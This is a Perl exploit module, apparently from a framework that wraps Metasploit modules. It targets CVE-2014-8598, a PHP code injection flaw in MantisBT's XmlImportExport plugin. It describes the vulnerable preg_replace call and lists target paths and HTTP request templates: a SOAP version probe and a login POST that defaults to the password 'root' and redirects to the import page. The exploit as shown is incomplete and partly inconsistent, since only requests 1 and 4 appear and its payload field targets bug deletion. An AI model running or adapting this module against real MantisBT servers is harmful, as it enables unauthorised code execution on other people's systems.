package MANTISBT::MSF::MantisbtPhpExec;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "MantisbtPhpExec";

   my $DETECTION = {

   };

my $EXPLOIT = {
  "CVE"                          => "CVE-2014-8598",
  "DESCRIPTION"                  => "

        This module exploits a post-auth vulnerability found in MantisBT versions 1.2.0a3 up to 1.2.17 when the Import/Export plugin is installed.

        The vulnerable code exists on plugins/XmlImportExport/ImportXml.php, which receives user input through the \"description\" field and the \"issuelink\" attribute of an uploaded XML file and passes to preg_replace() function with the /e modifier.

        This allows a remote authenticated attacker to execute arbitrary PHP code on the remote machine.

        This version also suffers from another issue. The import page is not checking the correct user level

        of the user, so it's possible to exploit this issue with any user including the anonymous one if enabled.

      ",
  "METHOD"                       => "POST",
  "MSF_MODULE"                   => "mantisbt_php_exec",
  "PATH"                         => "bug_actiongroup.php?",
  "PATHS"                        => [
                                      "api/soap/mantisconnect.php",
                                      "login_page.php",
                                      "login.php",
                                      "plugin.php",
                                      "plugin.php?page=XmlImportExport/import_action",
                                      "my_view_page.php",
                                      "bug_actiongroup_page.php",
                                      "bug_actiongroup.php",
                                      "",
                                    ],
  "PAYLOAD"                      => "bug_actiongroup_DELETE_token=__BUG_ACTIONGROUP_DELETE_TOKEN__&bug_arr[]=__BUG_ARR[]__&action=DELETE&",
  "REFERENCES"                   => [
                                      "https://www.mantisbt.org/bugs/view.php?id=17725",
                                      "https://www.mantisbt.org/bugs/view.php?id=17780",
                                    ],
  "TITLE"                        => "MantisBT XmlImportExport Plugin PHP Code Injection Vulnerability",
  "USERTITLE TO AUTHENTICATE AS" => "administrator",
  VARIABLES => {
    'USERNAME' =>       { DESCRIPTION => "", VALUE => "" },
    'PATH' =>       { DESCRIPTION => "Base directory path", VALUE => "/" },
    '' =>       { DESCRIPTION => "", VALUE => "" },
    'BUG_ACTIONGROUP_DELETE_TOKEN' =>       { DESCRIPTION => "", VALUE => "" },
    'BUG_ARR[]' =>       { DESCRIPTION => "", VALUE => "" },
    'PASSWORD' =>       { DESCRIPTION => "Pasword to authenticate as", VALUE => "root" },
    'RETURN' =>       { DESCRIPTION => "", VALUE => "" },
  },

  TYPE => 'MSF',
  PLATFORM => 'MULTI',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => 'api/soap/mantisconnect.php',
      PAYLOAD      => '<soapenv:Envelope xmlns:man=\'http://futureware.biz/mantisconnect\' xmlns:soapenv=\'http://schemas.xmlsoap.org/soap/envelope/\' xmlns:xsd=\'http://www.w3.org/2001/XMLSchema\' xmlns:xsi=\'http://www.w3.org/2001/XMLSchema-instance\'><soapenv:Header/><soapenv:Body><man:mc_version soapenv:encodingStyle=\'http://schemas.xmlsoap.org/soap/encoding/\'/></soapenv:Body></soapenv:Envelope>',
      TEXT   => 'Sending Exploit #1 Request : [POST] /api/soap/mantisconnect.php',
      HEADERS      => {
        'SOAPAction' => 'http://www.mantisbt.org/bugs/api/soap/mantisconnect.php/mc_version',
        'Content-Type' => 'text/xml; charset=UTF-8',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
    EXPLOIT4 => {
      METHOD       => 'POST',
      PATH   => 'login.php',
      PAYLOAD      => 'return=/MULTI/MANTISBT/MantisbtPhpExec/plugin.php%3fpage%3dXmlImportExport/import&username=__USERNAME__&password=__PASSWORD__&secure_session=on',
      TEXT   => 'Sending Exploit #4 Request : [POST] /login.php',
      HEADERS      => {
        'Cookie' => '',
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
